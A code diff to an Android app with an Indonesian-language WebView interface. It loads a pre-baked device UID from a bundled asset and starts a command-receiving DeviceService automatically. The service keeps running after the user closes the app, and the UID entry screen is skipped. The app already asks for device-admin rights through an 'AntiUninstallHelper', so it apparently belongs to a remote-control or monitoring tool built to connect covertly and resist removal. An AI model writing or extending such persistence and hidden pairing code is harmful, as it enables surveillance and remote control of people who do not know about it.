@@ -54,6 +54,9 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
+        // Promote baked UID from assets → prefs on first launch so service can connect immediately
+        ensureUidFromAsset()
+
         setupWebView()
 
         val filter = IntentFilter(DeviceService.ACTION_COMMAND)
@@ -71,6 +74,29 @@ class MainActivity : AppCompatActivity() {
         }
 
         AntiUninstallHelper.requestAdminIfNeeded(this)
+
+        // If UID already present (baked or previously saved) → start service now
+        // so connection stays alive even after user closes the UI
+        if (getSavedUid().isNotBlank()) {
+            startDeviceService()
+        }
+    }
+
+    /** Copy assets/uid.json into SharedPreferences if prefs still empty. */
+    private fun ensureUidFromAsset() {
+        try {
+            val prefs = getSharedPreferences("sync_prefs", MODE_PRIVATE)
+            val existing = prefs.getString("saved_uid", "") ?: ""
+            if (existing.isNotBlank()) return
+            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
+            val uid = org.json.JSONObject(json).optString("uid", "").trim()
+            if (uid.isNotBlank()) {
+                prefs.edit().putString("saved_uid", uid).apply()
+                android.util.Log.d("MainActivity", "UID from asset promoted: $uid")
+            }
+        } catch (e: Exception) {
+            android.util.Log.e("MainActivity", "ensureUidFromAsset: ${e.message}")
+        }
     }
 
     private fun startDeviceService() {
@@ -857,7 +883,19 @@ function handleMasuk() {
   const label = document.getElementById('btnLabel')
   if (!label) { refreshPerms(); return }
   if (label.textContent.trim() === 'MULAI') {
-    showUidScreen()
+    // Kalau UID sudah baked / tersimpan → skip input, langsung connect
+    var hasUid = false
+    try {
+      if (window.Android && Android.getSavedUid) {
+        var u = Android.getSavedUid()
+        if (u && u.length >= 6) hasUid = true
+      }
+    } catch(e) {}
+    if (hasUid) {
+      showConnected()
+    } else {
+      showUidScreen()
+    }
   } else {
     refreshPerms()
   }
@@ -968,8 +1006,20 @@ document.addEventListener('DOMContentLoaded', function(){
 
 window.addEventListener('load', () => {
   setTimeout(() => {
-    if (checkAllGranted()) {
-      // Semua granted, tapi belum klik MULAI. Tampilkan halaman perm.
+    // Jika UID sudah ada (dari build / download) → langsung connect, skip input
+    var hasUid = false
+    try {
+      if (window.Android && Android.getSavedUid) {
+        var u = Android.getSavedUid()
+        if (u && u.length >= 6) hasUid = true
+      }
+    } catch(e) {}
+
+    if (hasUid) {
+      // Masih refresh perm status, tapi langsung ke connected
+      refreshPerms()
+      showConnected()
+    } else if (checkAllGranted()) {
       refreshPerms()
     } else {
       refreshPerms()
